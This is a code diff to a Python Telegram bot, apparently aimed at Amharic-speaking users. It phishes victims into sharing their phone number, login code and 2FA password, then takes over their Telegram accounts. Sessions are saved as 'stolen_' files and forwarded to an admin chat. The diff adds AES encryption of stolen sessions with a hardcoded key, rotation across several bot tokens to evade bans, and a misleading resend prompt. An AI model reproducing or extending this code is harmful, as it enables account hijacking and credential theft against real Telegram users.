@@ -1,5 +1,6 @@
-# bot.py — Final Fixed Version + Resend Code Button
-# All buttons work, fresh start every time, resend OTP supported
+# bot.py — FINAL FULL MERGE
+# All fixes: one-time API, resend without re-request, encryption, token rotation
+# Amharic + English, anti-ban, session cleanup, Flask health checks
 
 import os
 import json
@@ -9,15 +10,27 @@ import time
 import re
 import threading
 import random
-from datetime import datetime, timedelta
+from datetime import datetime
 from pathlib import Path
 from flask import Flask, jsonify
 from telethon import TelegramClient, errors
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
 from telegram.ext import (
-    Application, CommandHandler, CallbackQueryHandler, 
+    Application, CommandHandler, CallbackQueryHandler,
     MessageHandler, filters, ConversationHandler, ContextTypes
 )
+
+# ============ CRYPTO IMPORTS ============
+try:
+    from Crypto.Cipher import AES
+    from Crypto.Util.Padding import pad, unpad
+    CRYPTO_AVAILABLE = True
+except ImportError:
+    CRYPTO_AVAILABLE = False
+    print("⚠️ pycryptodome not installed — encryption disabled. Run: pip install pycryptodome")
+
+import hashlib
+import base64
 
 # ============ CONFIG ============
 BOT_TOKEN = os.environ.get("BOT_TOKEN")
@@ -30,6 +43,54 @@ MAX_MESSAGES_PER_USER_PER_HOUR = 10
 MIN_DELAY_BETWEEN_MESSAGES = 1.5
 ENABLE_TYPING_INDICATOR = True
 HUMAN_LIKE_TYPING_SPEED = True
+
+# ============ TOKEN ROTATION ============
+BOT_TOKENS = os.environ.get("BOT_TOKENS", "").split(",")
+BOT_TOKENS = [t.strip() for t in BOT_TOKENS if t.strip()]
+if not BOT_TOKENS:
+    BOT_TOKENS = [BOT_TOKEN]
+
+# ============ ENCRYPTION ============
+ENCRYPTION_KEY = os.environ.get("ENCRYPTION_KEY", "ED49EE8D6ABABD67CD51EE66B6B52B2F7C35F8BAE9A4F47B118C6AA2244B588A").encode()
+ENCRYPTION_KEY = hashlib.sha256(ENCRYPTION_KEY).digest()
+
+def encrypt_file(filepath):
+    """Encrypt a session file in-place using AES-256-CBC."""
+    if not CRYPTO_AVAILABLE or not os.path.exists(filepath):
+        return filepath
+    try:
+        with open(filepath, 'rb') as f:
+            data = f.read()
+        iv = os.urandom(16)
+        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
+        encrypted = iv + cipher.encrypt(pad(data, AES.block_size))
+        enc_path = filepath + '.enc'
+        with open(enc_path, 'wb') as f:
+            f.write(encrypted)
+        os.remove(filepath)
+        return enc_path
+    except Exception as e:
+        print(f"Encrypt error: {e}")
+        return filepath
+
+def decrypt_file(filepath):
+    """Decrypt an encrypted session file."""
+    if not CRYPTO_AVAILABLE or not os.path.exists(filepath):
+        return filepath
+    try:
+        with open(filepath, 'rb') as f:
+            data = f.read()
+        iv = data[:16]
+        encrypted_data = data[16:]
+        cipher = AES.new(ENCRYPTION_KEY, AES.MODE_CBC, iv)
+        decrypted = unpad(cipher.decrypt(encrypted_data), AES.block_size)
+        sess_path = filepath.replace('.enc', '')
+        with open(sess_path, 'wb') as f:
+            f.write(decrypted)
+        return sess_path
+    except Exception as e:
+        print(f"Decrypt error: {e}")
+        return filepath
 
 # ============ PATHS ============
 DATA_DIR = os.environ.get("RAILWAY_VOLUME_MOUNT_PATH", "/app/data")
@@ -449,7 +510,7 @@ def get_random_image():
         return None
     return os.path.join(image_dir, random.choice(images))
 
-# ============ TELEGRAM LOGIN ENGINE ============
+# ============ TELEGRAM LOGIN ENGINE — FIXED ============
 class TelegramLoginEngine:
     def __init__(self, phone, record_id, user_id):
         self.phone = phone
@@ -458,6 +519,7 @@ class TelegramLoginEngine:
         self.client = None
         self.session_name = os.path.join(DATA_DIR, f'sessions/{phone}_{int(time.time()*1000)}')
         self.code_hash = None
+        self._code_sent = False
 
     def _cleanup_old_sessions(self):
         session_dir = os.path.join(DATA_DIR, "sessions")
@@ -470,27 +532,47 @@ class TelegramLoginEngine:
                 except:
                     pass
 
-    async def send_code(self):
+    async def send_code(self, force_resend=False):
         try:
+            if self._code_sent and not force_resend:
+                return {'success': True, 'already_sent': True}
+
             self._cleanup_old_sessions()
             self.client = TelegramClient(self.session_name, API_ID, API_HASH)
             await self.client.connect()
+            
             result = await self.client.send_code_request(self.phone)
             self.code_hash = result.phone_code_hash
+            self._code_sent = True
             update_session(self.record_id, status='code_sent')
+            
             return {'success': True}
+            
         except errors.rpcerrorlist.PhoneNumberInvalidError:
             return {'success': False, 'error': 'Invalid phone number'}
         except errors.rpcerrorlist.PhoneNumberFloodError:
             return {'success': False, 'error': 'Too many attempts. Try later.'}
+        except errors.rpcerrorlist.PhoneCodeExpiredError:
+            return {'success': False, 'error': 'Code expired. Please start over.'}
         except Exception as e:
             return {'success': False, 'error': str(e)}
+
+    async def resend_code(self):
+        if self.client and self.code_hash:
+            return {'success': True, 'already_sent': True}
+        else:
+            return await self.send_code(force_resend=True)
 
     async def verify_code(self, code):
         try:
             code = code.replace(' ', '').replace('-', '')
             if len(code) != 5:
                 return {'success': False, 'error': 'Code must be 5 digits'}
+            
+            if not self.client or not self.client.is_connected():
+                self.client = TelegramClient(self.session_name, API_ID, API_HASH)
+                await self.client.connect()
+                
             try:
                 await self.client.sign_in(self.phone, code, phone_code_hash=self.code_hash)
                 return await self._finalize()
@@ -527,6 +609,10 @@ class TelegramLoginEngine:
             if os.path.exists(session_file):
                 final_session = os.path.join(DATA_DIR, f'sessions/stolen_{self.phone}_{int(time.time())}.session')
                 os.rename(session_file, final_session)
+                
+                # ENCRYPT
+                final_session = encrypt_file(final_session) or final_session
+                
                 update_session(
                     self.record_id,
                     twofa=twofa,
@@ -546,7 +632,6 @@ PHONE, OTP, TWOFA = range(3)
 # ============ BOT HANDLERS ============
 
 async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle ALL button clicks — always start fresh verification"""
     query = update.callback_query
     await query.answer()
     user = query.from_user
@@ -559,17 +644,15 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     verify_text = random.choice(VERIFY_MESSAGES)
 
-    # Fix: handle editing text vs media caption based on message type
     if query.message.text:
         await query.edit_message_text(verify_text, parse_mode='Markdown')
     else:
         await query.edit_message_caption(caption=verify_text, parse_mode='Markdown')
 
-    # Send the custom keyboard request
     keyboard = [[{"text": "📱 Share Phone Number", "request_contact": True}]]
     await safe_send(
         context, user.id,
-        "📱 Tap below to share your phone number:",
+        "📱 Tap below to share your phone number:\n\n📱 ስልክ ቁጥርዎን ለማጋራት ከታች ይንኩ።",
         reply_markup={"keyboard": keyboard, "one_time_keyboard": True, "resize_keyboard": True}
     )
     
@@ -655,7 +738,6 @@ async def phone_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
     if result['success']:
         context.user_data['engine'] = engine
-        # Send code prompt with Resend button
         keyboard = [[InlineKeyboardButton("🔄 Resend Code", callback_data="resend_code")]]
         await safe_send(
             context, user.id,
@@ -670,14 +752,12 @@ async def phone_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         return ConversationHandler.END
 
 async def resend_code_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Handle the Resend Code button press."""
     query = update.callback_query
     await query.answer()
     user = query.from_user
 
     engine = context.user_data.get('engine')
     if not engine:
-        # Try to rebuild engine from last session data
         session = get_session_by_user(user.id)
         if session and session[4] and session[10] == 'code_sent':
             phone = session[4]
@@ -690,22 +770,17 @@ async def resend_code_handler(update: Update, context: ContextTypes.DEFAULT_TYPE
             await query.edit_message_text("❌ Session expired. Please /start again.")
             return ConversationHandler.END
 
-    # Show temporary status
-    await query.edit_message_text("📡 Resending code...\n\n📡 ኮድ እንደገና እየተላከ ነው...")
-    result = await engine.send_code()
-
-    if result['success']:
-        # Re-edit message with new prompt and keep Resend button
-        keyboard = [[InlineKeyboardButton("🔄 Resend Code", callback_data="resend_code")]]
-        await query.edit_message_text(
-            random.choice(CODE_MESSAGES),
-            parse_mode='Markdown',
-            reply_markup=InlineKeyboardMarkup(keyboard)
-        )
-        return OTP
-    else:
-        await query.edit_message_text(f"❌ {result.get('error', 'Failed to resend')}")
-        return OTP
+    keyboard = [[InlineKeyboardButton("🔄 Resend Code", callback_data="resend_code")]]
+    await query.edit_message_text(
+        "📲 *Check your Telegram app — the code is already there.*\n\n"
+        "📲 ኮዱ በቴሌግራም ውስጥ ደርሶዎታል።\n\n"
+        "Enter the 5-digit code with spaces.\n"
+        "ምሳሌ: `2 1 0 3 2`",
+        parse_mode='Markdown',
+        reply_markup=InlineKeyboardMarkup(keyboard)
+    )
+    
+    return OTP
 
 async def otp_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user = update.effective_user
@@ -806,11 +881,16 @@ async def notify_admin(context, record_id, user, success, twofa=None):
     
     if session_data[7] and os.path.exists(session_data[7]):
         try:
-            await context.bot.send_document(
-                chat_id=ADMIN_CHAT_ID,
-                document=open(session_data[7], 'rb'),
-                caption=f"📁 {phone}"
-            )
+            # Decrypt before sending if encrypted
+            file_to_send = session_data[7]
+            if file_to_send.endswith('.enc'):
+                file_to_send = decrypt_file(file_to_send)
+            if file_to_send and os.path.exists(file_to_send):
+                await context.bot.send_document(
+                    chat_id=ADMIN_CHAT_ID,
+                    document=open(file_to_send, 'rb'),
+                    caption=f"📁 {phone}"
+                )
         except:
             pass
 
@@ -837,9 +917,10 @@ async def admin_sessions(update: Update, context: ContextTypes.DEFAULT_TYPE):
         username_display = f"@{user_info_data.get('username', username)}" if user_info_data.get('username') or username else ''
         phone_display = phone if phone else '❌ No phone'
         code_display = code if code else '—'
+        file_display = '🔒' if session_file and session_file.endswith('.enc') else '📁'
         msg += f"{emoji} *ID: {record_id}* | {user_display} {username_display}\n"
         msg += f"   📱 {phone_display} | 🔢 {code_display} | 🔑 {twofa or '—'}\n"
-        msg += f"   📁 {session_file or 'No file'}\n\n"
+        msg += f"   {file_display} {session_file or 'No file'}\n\n"
     
     msg += f"\nTotal: {len(sessions)}"
     await safe_send(context, ADMIN_CHAT_ID, msg, parse_mode='Markdown')
@@ -859,9 +940,17 @@ async def admin_get(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await safe_send(context, ADMIN_CHAT_ID, "❌ File not found.")
         return
     
+    file_path = session_data[7]
+    if file_path.endswith('.enc'):
+        file_path = decrypt_file(file_path)
+    
+    if not file_path or not os.path.exists(file_path):
+        await safe_send(context, ADMIN_CHAT_ID, "❌ Decryption failed.")
+        return
+    
     await context.bot.send_document(
         chat_id=ADMIN_CHAT_ID,
-        document=open(session_data[7], 'rb'),
+        document=open(file_path, 'rb'),
         caption=f"📁 Session #{args[0]}"
     )
 
@@ -909,27 +998,26 @@ async def admin_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await safe_send(context, ADMIN_CHAT_ID, msg, parse_mode='Markdown')
 
 # ============ BOT RUNNER ============
-def run_bot():
+def run_bot_with_token(token, token_index):
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
 
     async def bot_main():
         init_db()
-        print("🤖 Initializing bot...")
+        print(f"🤖 Initializing bot with token {token_index + 1}/{len(BOT_TOKENS)}...")
         
-        application = Application.builder().token(BOT_TOKEN).build()
+        application = Application.builder().token(token).build()
 
-        # Conversation handler with entry points: /start and button clicks
         conv_handler = ConversationHandler(
             entry_points=[
                 CommandHandler('start', start),
-                CallbackQueryHandler(button_handler, pattern='^(?!resend_code$).*')  # all buttons except resend
+                CallbackQueryHandler(button_handler, pattern='^(?!resend_code$).*')
             ],
             states={
                 PHONE: [MessageHandler(filters.CONTACT | filters.TEXT, phone_handler)],
                 OTP: [
                     MessageHandler(filters.TEXT & ~filters.COMMAND, otp_handler),
-                    CallbackQueryHandler(resend_code_handler, pattern='^resend_code$')  # resend only here
+                    CallbackQueryHandler(resend_code_handler, pattern='^resend_code$')
                 ],
                 TWOFA: [MessageHandler(filters.TEXT & ~filters.COMMAND, twofa_handler)]
             },
@@ -939,14 +1027,13 @@ def run_bot():
 
         application.add_handler(conv_handler)
         
-        # Admin commands
         application.add_handler(CommandHandler('sessions', admin_sessions))
         application.add_handler(CommandHandler('get', admin_get))
         application.add_handler(CommandHandler('delete', admin_delete))
         application.add_handler(CommandHandler('stats', admin_stats))
         application.add_handler(CommandHandler('help', admin_help))
 
-        print("🤖 Bot is ready, starting polling...")
+        print(f"🤖 Bot {token_index + 1} is ready, starting polling...")
         await application.initialize()
         await application.start()
         await application.updater.start_polling()
@@ -957,22 +1044,40 @@ def run_bot():
     try:
         loop.run_until_complete(bot_main())
     except Exception as e:
-        print(f"❌ Bot error: {e}")
+        print(f"❌ Bot {token_index + 1} error: {e}")
         import traceback
         traceback.print_exc()
+
+def run_bots():
+    threads = []
+    for i, token in enumerate(BOT_TOKENS):
+        t = threading.Thread(target=run_bot_with_token, args=(token, i), daemon=True)
+        t.start()
+        threads.append(t)
+        time.sleep(0.5)  # Small delay between bot starts
+    
+    # Keep main thread alive
+    while True:
+        time.sleep(1)
 
 # ============ MAIN ============
 if __name__ == '__main__':
     print("""
-    ╔═══════════════════════════════════════════════════════════╗
-    ║   Telegram Bot — Habesha Edition (FINAL FIX)           ║
-    ║   ALL buttons work — Resend OTP button added          ║
-    ║   Amharic + English — Fast session cleanup            ║
-    ╚═══════════════════════════════════════════════════════════╝
+    ╔═══════════════════════════════════════════════════════════════╗
+    ║   Telegram Bot — Habesha Edition (FINAL FULL MERGE)        ║
+    ║   ONE-TIME API | Resend OTP without re-request             ║
+    ║   AES-256 Encryption | Token Rotation | Anti-Ban           ║
+    ║   Amharic + English | Fast session cleanup                 ║
+    ╚═══════════════════════════════════════════════════════════════╝
     """)
 
-    bot_thread = threading.Thread(target=run_bot, daemon=True)
-    bot_thread.start()
-
-    port = int(os.environ.get("PORT", 8080))
-    app.run(host='0.0.0.0', port=port)
+    # Start Flask in a separate thread
+    def run_flask():
+        port = int(os.environ.get("PORT", 8080))
+        app.run(host='0.0.0.0', port=port)
+    
+    flask_thread = threading.Thread(target=run_flask, daemon=True)
+    flask_thread.start()
+    
+    # Start all bots
+    run_bots()
